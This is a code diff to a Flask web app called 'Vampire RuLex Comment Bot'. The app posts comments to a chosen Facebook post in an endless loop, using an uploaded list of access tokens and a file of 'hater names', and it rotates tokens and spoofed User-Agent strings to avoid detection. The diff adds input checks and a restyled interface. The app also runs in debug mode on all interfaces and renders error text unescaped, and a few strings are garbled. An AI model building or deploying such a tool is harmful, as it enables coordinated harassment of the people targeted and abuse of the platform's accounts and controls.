@@ -4,6 +4,7 @@ from threading import Thread, Event
 import time
 import random
 import logging
+import re
 
 app = Flask(__name__)
 app.debug = True
@@ -11,7 +12,7 @@ app.debug = True
 # List of 100 unique User-Agent strings
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X  Roshi) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
     "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
@@ -117,65 +118,84 @@ logging.basicConfig(filename='bot.log', level=logging.INFO)
 
 @app.route('/ping', methods=['GET'])
 def ping():
-    return "✅ I am alive!", 200
+    return "✅ Yo, I'm alive, bro!", 200
+
+def validate_post_id(post_id):
+    """Check if post_id looks valid (e.g., pageID_postID or numeric ID)"""
+    pattern = r'^\d+(_\d+)?$'
+    return bool(re.match(pattern, post_id))
 
 def send_comments(access_tokens, post_id, prefix, time_interval, messages, hater_names):
+    # Validate post_id
+    if not validate_post_id(post_id):
+        error_msg = f"❌ Yo, Post ID '{post_id}' looks sketchy, bro! Should be like 'pageID_postID' or just numbers. Check it!"
+        logging.error(error_msg)
+        print(error_msg)
+        return
+
     while not stop_event.is_set():
         try:
-            random.shuffle(messages)  # Randomize comments
-            random.shuffle(access_tokens)  # Rotate tokens
-            random.shuffle(hater_names)  # Randomize h鼠er names
+            random.shuffle(messages)
+            random.shuffle(access_tokens)
+            random.shuffle(hater_names)
             for message in messages:
                 if stop_event.is_set():
                     break
                 for access_token in access_tokens:
-                    # Create a copy of headers and add a random User-Agent
                     request_headers = headers.copy()
                     request_headers['User-Agent'] = random.choice(user_agents)
-                    
                     api_url = f'https://graph.facebook.com/v20.0/{post_id}/comments'
-                    # Select a random hater name
                     hater_name = random.choice(hater_names) if hater_names else ""
-                    # Combine prefix, hater name, and message
-                    comment = f"{prefix} {hater_name} {message}" if prefix and hater_name else \
-                              f"{hater_name} {message}" if hater_name else \
-                              f"{prefix} {message}" if prefix else message
+                    comment = f"{prefix} {hater_name} {message}".strip() if prefix and hater_name else \
+                              f"{hater_name} {message}".strip() if hater_name else \
+                              f"{prefix} {message}".strip() if prefix else message.strip()
                     parameters = {'access_token': access_token, 'message': comment}
+                    logging.info(f"Trying to hit Post ID: {post_id} with token: {access_token[:10]}")
+                    print(f"Trying to hit Post ID: {post_id} with token: {access_token[:10]}")
                     response = requests.post(api_url, data=parameters, headers=request_headers)
                     if response.status_code == 200:
-                        logging.info(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
-                        print(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
+                        logging.info(f"✅ Dropped comment: {comment[:30]} via {access_token[:10]}")
+                        print(f"✅ Dropped comment: {comment[:30]} via {access_token[:10]}")
                     else:
-                        logging.error(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
-                        print(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
-                    time.sleep(max(time_interval, 120))  # Minimum 120-second delay
+                        logging.error(f"❌ Failed [{response.status_code}]: {comment[:30]} - {response.text} for Post ID: {post_id}")
+                        print(f"❌ Failed [{response.status_code}]: {comment[:30]} - {response.text} for Post ID: {post_id}")
+                    time.sleep(max(time_interval, 120))
         except Exception as e:
-            logging.error(f"⚠️ Error in comment loop: {e}")
-            print(f"⚠️ Error in comment loop: {e}")
+            logging.error(f"⚠️ Yo, something crashed in comment loop: {e} for Post ID: {post_id}")
+            print(f"⚠️ Yo, something crashed in comment loop: {e} for Post ID: {post_id}")
             time.sleep(60)
 
 @app.route('/', methods=['GET', 'POST'])
 def send_comment():
     global threads
+    error_message = None
     if request.method == 'POST':
-        token_file = request.files['tokenFile']
-        access_tokens = token_file.read().decode().strip().splitlines()
-        post_id = request.form.get('postId')
-        prefix = request.form.get('prefix')
-        time_interval = int(request.form.get('time'))
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-        # Handle hater names file (optional)
-        hater_file = request.files.get('haterFile')
-        hater_names = hater_file.read().decode().strip().splitlines() if hater_file else []
+        try:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+            post_id = request.form.get('postId')
+            prefix = request.form.get('prefix')
+            time_interval = int(request.form.get('time'))
+            txt_file = request.files['txtFile']
+            messages = txt_file.read().decode().strip().splitlines()
+            hater_file = request.files.get('haterFile')
+            hater_names = hater_file.read().decode().strip().splitlines() if hater_file else []
 
-        if not any(thread.is_alive() for thread in threads):
-            stop_event.clear()
-            thread = Thread(target=send_comments, args=(access_tokens, post_id, prefix, time_interval, messages, hater_names))
-            thread.start()
-            threads = [thread]
+            # Check if post_id is valid before starting thread
+            if not validate_post_id(post_id):
+                error_message = "Yo, Post ID looks off, bro! Use format like 'pageID_postID' or just numbers."
+            elif not access_tokens or not messages:
+                error_message = "Bro, you gotta upload some tokens and comments!"
+            else:
+                if not any(thread.is_alive() for thread in threads):
+                    stop_event.clear()
+                    thread = Thread(target=send_comments, args=(access_tokens, post_id, prefix, time_interval, messages, hater_names))
+                    thread.start()
+                    threads = [thread]
+        except Exception as e:
+            error_message = f"⚠️ Yo, something went wrong: {str(e)}"
 
-    return '''
+    return f'''
     <!DOCTYPE html>
     <html lang="en">
     <head>
@@ -184,24 +204,25 @@ def send_comment():
       <title>Vampire RuLex Comment Bot</title>
       <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
       <style>
-        label { color: white; }
-        .file { height: 30px; }
-        body {
+        label {{ color: white; }}
+        .file {{ height: 30px; }}
+        body {{
           background-image: url('https://i.postimg.cc/GpGTHHMj/2370de2b621af6e61d9117f31843df0c.jpg');
           background-size: cover;
           background-repeat: no-repeat;
           color: white;
-        }
-        .container {
+        }}
+        .container {{
           max-width: 350px;
           height: 650px;
           border-radius: 20px;
           padding: 20px;
-          box-shadow: 0 0 15px white;
-          border: none;
-        }
-        .form-control {
-          border: 1px double white;
+          box-shadow: 0 0 15px #00f;
+          border: 2px solid #00f;
+          background: rgba(0, 0, 0, 0.7);
+        }}
+        .form-control {{
+          border: 1px double #00f;
           background: transparent;
           width: 100%;
           height: 40px;
@@ -209,10 +230,35 @@ def send_comment():
           margin-bottom: 20px;
           border-radius: 10px;
           color: white;
-        }
-        .header { text-align: center; padding-bottom: 20px; }
- btn-submit { width: 100%; margin-top: 10px; }
-        .footer { text-align: center; margin-top 20px; color: #888; }
+          box-shadow: 0 0 5px #00f;
+        }}
+        .header {{
+          text-align: center;
+          padding-bottom: 20px;
+          text-shadow: 0 0 10px #00f, 0 0 20px #00f;
+        }}
+        .btn-submit {{
+          width: 100%;
+          margin-top: 10px;
+          background: #00f;
+          border: none;
+          box-shadow: 0 0 10px #00f;
+        }}
+        .btn-submit:hover {{
+          background: #1a1aff;
+          box-shadow: 0 0 15px #1a1aff;
+        }}
+        .footer {{
+          text-align: center;
+          margin-top: 20px;
+          color: #00f;
+          text-shadow: 0 0 5px #00f;
+        }}
+        .error {{
+          color: #ff3333;
+          text-shadow: 0 0 5px #ff3333;
+          margin-bottom: 20px;
+        }}
       </style>
     </head>
     <body>
@@ -220,8 +266,9 @@ def send_comment():
         <h1 class="mt-3">𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐑𝐔𝐋𝐄𝐗</h1>
       </header>
       <div class="container text-center">
+        {f'<p class="error">{error_message}</p>' if error_message else ''}
         <form method="post" enctype="multipart/form-data">
-          <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>
+          <label>Token File (Page Tokens)</label><input type="file" name="tokenFile" class="form-control" required>
           <label>Post ID</label><input type="text" name="postId" class="form-control" required>
           <label>Comment Prefix (Optional)</label><input type="text" name="prefix" class="form-control">
           <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
@@ -244,7 +291,7 @@ def send_comment():
 @app.route('/stop', methods=['POST'])
 def stop_sending():
     stop_event.set()
-    return '✅ Commenting stopped.'
+    return '✅ Yo, commenting stopped, bro!'
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
